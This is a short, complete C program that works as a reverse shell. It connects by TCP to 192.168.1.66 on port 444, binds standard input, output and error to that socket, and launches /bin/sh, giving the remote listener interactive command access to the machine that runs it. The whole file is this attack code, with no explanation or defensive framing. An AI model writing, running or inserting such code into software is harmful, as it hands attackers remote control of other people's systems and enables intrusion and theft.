#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main() {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) {
        perror("socket");
        return 1;
    }

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(444),
        .sin_addr.s_addr = inet_addr("192.168.1.66"),
    };

    if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("connect");
        return 2;
    }

    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execl("/bin/sh", "sh", NULL);
    perror("execl");
    return 3;
}